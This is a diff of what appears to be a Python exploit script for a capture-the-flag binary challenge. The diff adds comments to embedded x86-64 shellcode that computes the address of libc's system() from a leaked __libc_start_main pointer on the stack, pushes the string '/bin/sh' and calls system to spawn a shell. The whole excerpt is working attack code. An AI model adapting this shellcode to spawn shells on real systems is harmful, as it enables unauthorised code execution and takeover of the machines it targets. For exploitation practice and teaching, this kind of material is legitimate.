@@ -28,17 +28,19 @@ def main():
     r = conn()
 
     assembly = '''
-	mov eax, dword [rsp+0x20]
+	mov eax, dword [rsp+0x20] ; load __libc_start_main addr from stack
 	mov edx, dword [rsp+0x24] 
 	
 	mov rdi, rdx
 	shl rdi, 32
-	or  rdi, rax
+	or  rdi, rax ; save __libc_start_main addr at rdi
 	
+	; calculate libc offset 
 	sub rdi, 0x80
-	sub rdi, 0x29d10
-	add rdi, 0x50d70
+	sub rdi, 0x29d10 ; sub __libc_start_main offset
+	add rdi, 0x50d70 ; calculate system function addr in libc
 	
+	; prepare system parameters
 	mov rax, 0x0068732f6e69622f
 	push rax
 	
@@ -46,6 +48,7 @@ def main():
 	mov rax, rdi
 	mov rdi, rsp
 	
+	; call rax (system)
 	call rax
     '''
     
